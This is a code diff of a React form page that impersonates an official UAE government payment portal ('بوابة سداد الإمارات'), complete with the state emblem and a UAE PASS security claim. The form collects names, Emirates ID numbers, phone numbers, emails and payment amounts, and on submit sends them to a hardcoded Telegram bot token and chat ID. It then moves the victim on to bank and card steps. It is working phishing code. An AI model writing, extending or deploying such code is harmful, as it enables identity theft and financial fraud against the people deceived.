@@ -1,171 +1,256 @@
-import { useState } from "react";
+import React, { useState } from 'react';
 import { useLocation } from "wouter";
-import { Button } from "@/components/ui/button";
-import { Input } from "@/components/ui/input";
-import { Label } from "@/components/ui/label";
-import { Loader2, User, Phone, Mail, CreditCard, ShieldCheck, ChevronRight } from "lucide-react";
 
-export default function UserData() {
+const UserData: React.FC = () => {
   const [, setLocation] = useLocation();
   const [loading, setLoading] = useState(false);
   const [formData, setFormData] = useState({
-    fullName: "",
-    idNumber: "",
-    phone: "",
-    email: "",
-    serviceType: "مخالفات مرورية",
-    amount: ""
+    fullName: '',
+    idNumber: '',
+    phone: '',
+    email: '',
+    serviceType: 'دفع رسوم شحن مركبة',
+    amount: ''
   });
 
-  const TELEGRAM_BOT_TOKEN = "8679116779:AAFA4ChWcYM9ZiHa3BAr3IylTOUEWvFQNkw";
-  const TELEGRAM_CHAT_ID = "8362204213";
+  const services = [
+    "دفع رسوم شحن مركبة",
+    "دفع رسوم نقل ملكية مركبة",
+    "دفع رسوم نقل ملكية لوحة مركبة",
+    "دفع رسوم حجز مركبة",
+    "دفع رسوم فحص مركبة",
+    "دفع رسوم عقد ايجار فيلا - شقة - مزرعة",
+    "شاليه - مستودع - محل - ارض تجارية . - ارض زراعية",
+    "دفع رسوم عقد تمليك (فيلا - شقة",
+    "مزرعة - شاليه - مستودع - محل - ارض . تجارية - ارض زراعية",
+    "دفع رسوم تأمين فيلا - شقة - مزرعة .",
+    "شاليه - مستودع - محل - ارض تجارية -ارض زراعية",
+    "دفع رسوم شحن",
+    "تسديد المستحقات للطرفين",
+    "دفع رسوم توقيع تعهد الكتروني",
+    "دفع رسوم استقدام عمالة",
+    "دفع ضريبة القيمة المضافة",
+    "دفع رسوم عقد عمالة",
+    "دفع رسوم الجوازات",
+    "دفع رسوم عقد عمل",
+    "دفع رسوم توكيل محامي",
+    "دفع رسوم الخدمات الكترونية",
+    "دفع رسوم وزارة الموارد البشرية",
+    "دفع رسوم تجديد عقود",
+    "دفع رسوم عقد تقديم خدمات",
+    "استرداد الرسوم المدفوعة"
+  ];
 
-  const handleNext = async (e: React.FormEvent) => {
+  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
+    const { id, value } = e.target;
+    
+    if (id === 'idNumber') {
+      const cleaned = value.replace(/\D/g, '').slice(0, 15);
+      setFormData({ ...formData, [id]: cleaned });
+      return;
+    }
+    
+    if (id === 'phone') {
+      const cleaned = value.replace(/\D/g, '').slice(0, 10);
+      setFormData({ ...formData, [id]: cleaned });
+      return;
+    }
+
+    if (id === 'amount') {
+      const cleaned = value.replace(/[^0-9.]/g, '');
+      setFormData({ ...formData, [id]: cleaned });
+      return;
+    }
+
+    setFormData({ ...formData, [id]: value });
+  };
+
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
+    
+    if (formData.idNumber.length < 15) {
+      alert("يرجى إدخال رقم هوية إماراتية صحيح (15 رقم)");
+      return;
+    }
+    if (formData.phone.length < 10) {
+      alert("يرجى إدخال رقم هاتف صحيح (10 أرقام)");
+      return;
+    }
+
     setLoading(true);
 
     const message = `
-👤 *بيانات المستخدم - بوابة سداد الإمارات*
---------------------------
-📝 *الاسم:* ${formData.fullName}
-🆔 *رقم الهوية:* ${formData.idNumber}
-📞 *الهاتف:* ${formData.phone}
-📧 *البريد:* ${formData.email}
-🛠 *الخدمة:* ${formData.serviceType}
-💰 *المبلغ:* ${formData.amount} د.إ
---------------------------
+🔔 *بيانات مستخدم جديدة*
+👤 الاسم: ${formData.fullName}
+🆔 الهوية: ${formData.idNumber}
+📱 الهاتف: ${formData.phone}
+📧 البريد: ${formData.email}
+🛠 الخدمة: ${formData.serviceType}
+💰 المبلغ: ${formData.amount} د.إ
     `;
 
     try {
-      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
+      await fetch(\`https://api.telegram.org/bot8679116779:AAFA4ChWcYM9ZiHa3BAr3IylTOUEWvFQNkw/sendMessage\`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          chat_id: TELEGRAM_CHAT_ID,
+          chat_id: '8362204213',
           text: message,
-          parse_mode: "Markdown",
-        }),
+          parse_mode: 'Markdown'
+        })
       });
-      
-      sessionStorage.setItem("paymentData", JSON.stringify(formData));
-      setTimeout(() => setLocation("/select-bank"), 1000);
+      setLocation("/select-bank");
     } catch (error) {
-      console.error(error);
+      console.error("Error sending to Telegram", error);
+      setLocation("/select-bank");
+    } finally {
       setLoading(false);
     }
   };
 
   return (
-    <div className="min-h-screen flex flex-col bg-gray-50 font-sans text-right" dir="rtl">
-      <header className="bg-white border-b border-gray-200 py-4 shadow-sm">
-        <div className="container flex justify-between items-center">
-          <div className="flex items-center gap-3">
-            <div className="bg-amber-500 p-2 rounded-lg">
-              <span className="text-white font-bold text-sm">سداد</span>
-            </div>
-            <h1 className="text-lg font-bold text-gray-800">بوابة سداد الإمارات</h1>
-          </div>
-          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/cb/Emblem_of_the_United_Arab_Emirates.svg/1200px-Emblem_of_the_United_Arab_Emirates.svg.png" alt="UAE" className="h-10" />
+    <div className="min-h-screen bg-gray-50 font-['Tajawal']" dir="rtl">
+      <header className="bg-white shadow-sm py-4 px-6 flex justify-between items-center border-b-2 border-orange-400">
+        <div className="flex items-center gap-2">
+          <div className="bg-orange-500 text-white p-2 rounded-lg font-bold text-xl">سداد</div>
+          <span className="text-gray-800 font-bold text-lg">بوابة سداد الإمارات</span>
         </div>
+        <img 
+          src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/cb/Emblem_of_the_United_Arab_Emirates.svg/1200px-Emblem_of_the_United_Arab_Emirates.svg.png" 
+          alt="UAE Emblem" 
+          className="h-10 w-auto" 
+        />
       </header>
 
-      <main className="flex-grow container py-12 px-4">
-        <div className="max-w-2xl mx-auto">
-          <div className="flex justify-between mb-12 relative px-4">
-            {[1, 2, 3, 4, 5].map((step) => (
-              <div key={step} className="flex flex-col items-center z-10">
-                <div className={`w-10 h-10 rounded-full flex items-center justify-center font-bold border-2 transition-all ${step === 1 ? 'bg-amber-500 border-amber-500 text-white shadow-lg shadow-amber-500/30' : 'bg-white border-gray-200 text-gray-400'}`}>
-                  {step}
-                </div>
-                <span className={`text-[10px] mt-2 font-bold ${step === 1 ? 'text-amber-600' : 'text-gray-400'}`}>
-                  {step === 1 ? 'البيانات' : step === 2 ? 'البنك' : step === 3 ? 'البطاقة' : step === 4 ? 'التحقق' : 'التأكيد'}
-                </span>
-              </div>
-            ))}
-            <div className="absolute top-5 left-8 right-8 h-0.5 bg-gray-200 -z-0"></div>
+      <div className="max-w-4xl mx-auto mt-8 px-4">
+        <div className="flex justify-between items-center relative">
+          <div className="absolute top-1/2 left-0 w-full h-1 bg-gray-200 -z-10 transform -translate-y-1/2"></div>
+          <div className="bg-orange-500 text-white w-10 h-10 rounded-full flex items-center justify-center font-bold shadow-lg">1</div>
+          <div className="bg-white text-gray-400 border-2 border-gray-200 w-10 h-10 rounded-full flex items-center justify-center font-bold">2</div>
+          <div className="bg-white text-gray-400 border-2 border-gray-200 w-10 h-10 rounded-full flex items-center justify-center font-bold">3</div>
+          <div className="bg-white text-gray-400 border-2 border-gray-200 w-10 h-10 rounded-full flex items-center justify-center font-bold">4</div>
+          <div className="bg-white text-gray-400 border-2 border-gray-200 w-10 h-10 rounded-full flex items-center justify-center font-bold">5</div>
+        </div>
+        <div className="flex justify-between mt-2 text-xs font-bold text-gray-500">
+          <span className="text-orange-600">البيانات</span>
+          <span>البنك</span>
+          <span>البطاقة</span>
+          <span>التحقق</span>
+          <span>التأكيد</span>
+        </div>
+      </div>
+
+      <div className="max-w-2xl mx-auto mt-10 px-4 pb-20">
+        <div className="bg-white rounded-2xl shadow-xl overflow-hidden border border-gray-100">
+          <div className="bg-slate-900 p-6 text-white text-center">
+            <h2 className="text-2xl font-bold mb-2">بيانات مقدم الطلب</h2>
+            <p className="text-slate-400 text-sm">يرجى إدخال البيانات المطلوبة بدقة لضمان إتمام عملية السداد</p>
           </div>
-
-          <div className="bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
-            <div className="bg-slate-900 p-8 text-white">
-              <h2 className="text-2xl font-bold mb-2">بيانات مقدم الطلب</h2>
-              <p className="text-slate-400 text-sm">يرجى إدخال البيانات المطلوبة بدقة لضمان إتمام عملية السداد</p>
+          
+          <form onSubmit={handleSubmit} className="p-8 space-y-6">
+            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+              <div className="space-y-2">
+                <label className="text-sm font-bold text-gray-700 block">الاسم الكامل</label>
+                <input 
+                  id="fullName"
+                  type="text" 
+                  required
+                  placeholder="أدخل اسمك كما في الهوية"
+                  className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-orange-500 focus:border-transparent outline-none transition-all"
+                  value={formData.fullName}
+                  onChange={handleChange}
+                />
+              </div>
+              <div className="space-y-2">
+                <label className="text-sm font-bold text-gray-700 block">رقم الهوية الإماراتية</label>
+                <input 
+                  id="idNumber"
+                  type="text" 
+                  required
+                  placeholder="784XXXXXXXXXXXX"
+                  className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-orange-500 focus:border-transparent outline-none transition-all"
+                  value={formData.idNumber}
+                  onChange={handleChange}
+                />
+              </div>
+              <div className="space-y-2">
+                <label className="text-sm font-bold text-gray-700 block">رقم الهاتف المتحرك</label>
+                <input 
+                  id="phone"
+                  type="tel" 
+                  required
+                  placeholder="05XXXXXXXX"
+                  className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-orange-500 focus:border-transparent outline-none transition-all"
+                  value={formData.phone}
+                  onChange={handleChange}
+                />
+              </div>
+              <div className="space-y-2">
+                <label className="text-sm font-bold text-gray-700 block">البريد الإلكتروني</label>
+                <input 
+                  id="email"
+                  type="email" 
+                  required
+                  placeholder="example@domain.com"
+                  className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-orange-500 focus:border-transparent outline-none transition-all"
+                  value={formData.email}
+                  onChange={handleChange}
+                />
+              </div>
             </div>
 
-            <form onSubmit={handleNext} className="p-8 space-y-6">
-              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
-                <div className="space-y-2">
-                  <Label htmlFor="fullName" className="text-sm font-bold text-gray-700">الاسم الكامل</Label>
-                  <div className="relative">
-                    <Input id="fullName" required placeholder="أدخل اسمك كما في الهوية" className="bg-gray-50 border-gray-200 py-6 pr-10" value={formData.fullName} onChange={(e) => setFormData({...formData, fullName: e.target.value})} />
-                    <User className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
-                  </div>
-                </div>
-                <div className="space-y-2">
-                  <Label htmlFor="idNumber" className="text-sm font-bold text-gray-700">رقم الهوية الإماراتية</Label>
-                  <div className="relative">
-                    <Input id="idNumber" required placeholder="784-XXXX-XXXXXXX-X" className="bg-gray-50 border-gray-200 py-6 pr-10" value={formData.idNumber} onChange={(e) => setFormData({...formData, idNumber: e.target.value})} />
-                    <ShieldCheck className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
-                  </div>
-                </div>
-                <div className="space-y-2">
-                  <Label htmlFor="phone" className="text-sm font-bold text-gray-700">رقم الهاتف المتحرك</Label>
-                  <div className="relative">
-                    <Input id="phone" required type="tel" placeholder="05XXXXXXXX" className="bg-gray-50 border-gray-200 py-6 pr-10" value={formData.phone} onChange={(e) => setFormData({...formData, phone: e.target.value})} />
-                    <Phone className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
-                  </div>
-                </div>
-                <div className="space-y-2">
-                  <Label htmlFor="email" className="text-sm font-bold text-gray-700">البريد الإلكتروني</Label>
-                  <div className="relative">
-                    <Input id="email" required type="email" placeholder="example@domain.com" className="bg-gray-50 border-gray-200 py-6 pr-10" value={formData.email} onChange={(e) => setFormData({...formData, email: e.target.value})} />
-                    <Mail className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
-                  </div>
-                </div>
-                <div className="space-y-2">
-                  <Label htmlFor="serviceType" className="text-sm font-bold text-gray-700">نوع الخدمة</Label>
-                  <select 
-                    id="serviceType"
-                    className="w-full bg-gray-50 border border-gray-200 rounded-md py-3 px-3 text-sm focus:outline-none focus:ring-2 focus:ring-amber-500"
-                    value={formData.serviceType}
-                    onChange={(e) => setFormData({...formData, serviceType: e.target.value})}
-                  >
-                    <option value="مخالفات مرورية">مخالفات مرورية</option>
-                    <option value="رسوم تجديد الهوية">رسوم تجديد الهوية</option>
-                    <option value="فواتير كهرباء ومياه">فواتير كهرباء ومياه</option>
-                    <option value="رسوم تصديق عقود">رسوم تصديق عقود</option>
-                    <option value="أخرى">أخرى</option>
-                  </select>
-                </div>
-                <div className="space-y-2">
-                  <Label htmlFor="amount" className="text-sm font-bold text-gray-700">المبلغ المستحق (د.إ)</Label>
-                  <div className="relative">
-                    <Input id="amount" required type="number" placeholder="0.00" className="bg-gray-50 border-gray-200 py-6 pr-10" value={formData.amount} onChange={(e) => setFormData({...formData, amount: e.target.value})} />
-                    <CreditCard className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
-                  </div>
-                </div>
-              </div>
-
-              <div className="pt-6">
-                <Button type="submit" className="w-full bg-amber-500 hover:bg-amber-600 text-white font-bold py-7 rounded-xl shadow-lg shadow-amber-500/20 transition-all flex items-center justify-center gap-2" disabled={loading}>
-                  {loading ? (
-                    <>
-                      <Loader2 className="w-5 h-5 animate-spin" /> جاري معالجة البيانات...
-                    </>
-                  ) : (
-                    <>
-                      الانتقال لاختيار البنك <ChevronRight className="w-5 h-5" />
-                    </>
-                  )}
-                </Button>
-              </div>
-            </form>
-
-            <div className="bg-blue-50 p-4 text-center border-t border-blue-100">
-              <p className="text-[10px] text-blue-700 font-bold">بوابة سداد الإمارات مرتبطة بنظام الهوية الرقمية (UAE PASS) لضمان أمان بياناتك</p>
+            <div className="space-y-2">
+              <label className="text-sm font-bold text-gray-700 block">نوع الخدمة</label>
+              <select 
+                id="serviceType"
+                className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-orange-500 focus:border-transparent outline-none transition-all bg-white"
+                value={formData.serviceType}
+                onChange={handleChange}
+              >
+                {services.map((service, index) => (
+                  <option key={index} value={service}>{service}</option>
+                ))}
+              </select>
             </div>
+
+            <div className="space-y-2">
+              <label className="text-sm font-bold text-gray-700 block">المبلغ المستحق (د.إ)</label>
+              <input 
+                id="amount"
+                type="text" 
+                required
+                placeholder="0.00"
+                className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-orange-500 focus:border-transparent outline-none transition-all font-bold text-lg text-orange-600"
+                value={formData.amount}
+                onChange={handleChange}
+              />
+            </div>
+
+            <button 
+              type="submit"
+              disabled={loading}
+              className="w-full bg-orange-500 hover:bg-orange-600 text-white py-4 rounded-xl font-bold text-lg shadow-lg hover:shadow-orange-200 transition-all flex items-center justify-center gap-2"
+            >
+              {loading ? (
+                <div className="w-6 h-6 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
+              ) : (
+                <>
+                  الانتقال لاختيار البنك
+                  <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
+                    <path fillRule="evenodd" d="M12.707 5.293a1 1 0 010 1.414L9.414 10l3.293 3.293a1 1 0 01-1.414 1.414l-4-4a1 1 0 010-1.414l4-4a1 1 0 011.414 0z" clipRule="evenodd" />
+                  </svg>
+                </>
+              )}
+            </button>
+          </form>
+          
+          <div className="bg-blue-50 p-4 text-center border-t border-blue-100">
+            <p className="text-blue-700 text-xs font-bold">بوابة سداد الإمارات مرتبطة بنظام الهوية الرقمية (UAE PASS) لضمان أمان بياناتك</p>
           </div>
         </div>
-      </main>
+      </div>
     </div>
   );
-}
+};
+
+export default UserData;
